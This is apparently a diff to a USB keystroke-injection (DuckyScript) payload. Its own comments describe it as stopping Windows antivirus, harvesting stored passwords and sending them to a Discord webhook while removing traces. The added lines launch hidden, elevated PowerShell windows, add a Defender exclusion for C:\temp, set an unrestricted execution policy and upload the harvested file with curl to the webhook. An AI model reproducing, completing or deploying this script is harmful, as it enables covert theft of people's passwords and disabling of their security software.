@@ -1,5 +1,5 @@
-REM This is a modified script by DEFHerobrine that: 
-REM  1. Stops windows anti-virus  2. Installs file that finds stored passwords  3. Sends html to discord  4. Removes any traces
+REM the only difference between this script and the other is that powershell isnt in a visible window.
+REM be sure to wait till the script is 100% done to remove USB
 REM This is V2 of the script, made for and tested on windows 11 
 REM Made by DEFHerobrine/DEFTech-YT
 GUI D
@@ -12,10 +12,11 @@ DELAY 2000
 LEFT
 DELAY 50
 ENTER
-DELAY 1500
-STRING $webhook = 'YOUR DISCORD WEBHOOK'
+DELAY 750
+STRING PowerShell.exe -WindowStyle hidden
+DELAY 750
 ENTER
-DELAY 500
+DELAY 1500
 STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
 ENTER
 DELAY 500
@@ -57,6 +58,25 @@ DELAY 3000
 ENTER
 ENTER
 DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -Noprofile "Start-Process powershell -verb runas"
+ENTER
+DELAY 2000
+LEFT
+DELAY 50
+ENTER
+DELAY 750
+STRING PowerShell.exe -WindowStyle hidden
+DELAY 750
+ENTER
+DELAY 1500
+STRING $webhook = 'YOUR DISCORD WEBHOOK'
+ENTER
+DELAY 500
+STRING cd C:\temp
+ENTER
+DELAY 500
 STRING curl.exe -F "file1=@temp.html" $webhook
 ENTER
 DELAY 1000
